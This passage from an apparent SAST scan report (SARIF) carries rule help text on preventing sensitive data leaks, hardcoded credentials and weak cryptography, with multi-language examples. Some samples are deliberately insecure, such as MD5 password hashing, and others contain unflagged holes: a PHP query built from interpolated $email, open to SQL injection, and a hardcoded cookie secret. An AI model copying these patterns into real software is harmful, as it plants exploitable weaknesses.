configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**",
                                "text": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
                            "id": "Secret%20Keyword/eb9de170ff9fef0599ea851a532b8101f1f950ef743cf8474569c265bbcc4991",
                            "name": "Secret Keyword",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "5.5",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 5.5",
                                    "Generic Secret",
                                    "OWASP a3-sensitive-data-exposure"
                                ]
                            },
                            "shortDescription": {
                                "text": "Secret Keyword"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Credentials are hardcoded, allowing everyone with access to the source code or compilation."
                            },
                            "help": {
                                "markdown": "Credentials are hardcoded, allowing everyone with access to the source code or compilation\n artifacts to impersonate the application and access protected data or systems.\n ## Countermeasures\n - Retrieve credentials from a secured location only accessible from the production environment.\n ## Additional information\n **[CWE-259](https://cwe.mitre.org/data/definitions/259.html)**\n **[CWE-798](https://cwe.mitre.org/data/definitions/798.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**",
                                "text": "Credentials are hardcoded, allowing everyone with access to the source code or compilation\n artifacts to impersonate the application and access protected data or systems.\n ## Countermeasures\n - Retrieve credentials from a secured location only accessible from the production environment.\n ## Additional information\n **[CWE-259](https://cwe.mitre.org/data/definitions/259.html)**\n **[CWE-798](https://cwe.mitre.org/data/definitions/798.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
                            "id": "Secret%20Keyword/0b499b8f27a7044499835c4dd4e623299e86469b3f5cc34a1c7ac725741070ba",
                            "name": "Secret Keyword",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "5.5",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 5.5",
                                    "Generic Secret",
                                    "OWASP a3-sensitive-data-exposure"
                                ]
                            },
                            "shortDescription": {
                                "text": "Secret Keyword"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Usage of a broken cryptographic algorithm was identified."
                            },
                            "help": {
                                "markdown": "Usage of a broken cryptographic algorithm was identified.\n\n# Encryption Vulnerabilities\n\nEncryption powers the modern internet, allowing secure storage of data and transmission of secrets across a network\nin such a way they cannot be inspected or tampered with by a third party. It is important that you use *strong\nencryption* algorithms when securing data in this way, or an attacker will be able to backwards engineer confidential\ninformation if they possess enough computing power.\n\n## Encryption Algorithms\n\nEncryption algorithms are designed to encode the contents of a string or binary object in such away that an attacker\nwho does not possession the decryption key will not be able to decipher the contents. *Cryptography* - the study of \nencryption algorithms - is a complex field, and new encryption algorithms are invented by mathematicians frequently.\n\nAs computing power gets cheaper, it becomes easier for an attacker to use brute-force to decrypt the contents of \nencrypted data. For this reason, it's important to use modern encryption algorithms in your code, so your secrets\nremain safe.\n\n::::tabs\n\n:::tab[Java]\n\nConsider the following Java function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```java\npublic static String hashPassword(String password) throws java.security.NoSuchAlgorithmException\n{\n   java.security.MessageDigest digest = java.security.MessageDigest.getInstance(\"MD5\");\n   byte[] bytes = md.digest(password.getBytes());\n   \n   return org.apache.commons.codec.binary.Hex.encodeHexString(bytes);\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[C#]\n\nConsider the following C# function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```csharp\n// An example of weak password hash. Don't use MD5 to encrypt passwords!\npublic static string HashPassword(string password)\n{\n    using (System.Security.Cryptography.MD5 md5 = System.Security.Cryptography.MD5.Create())\n    {\n        byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(password);\n        byte[] hashBytes  = md5.ComputeHash(inputBytes);\n\n        // Convert the byte array to hexadecimal string.\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < hashBytes.Length; i++)\n        {\n            sb.Append(hashBytes[i].ToString(\"X2\"));\n        }\n        \n        return sb.ToString();\n    }\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* 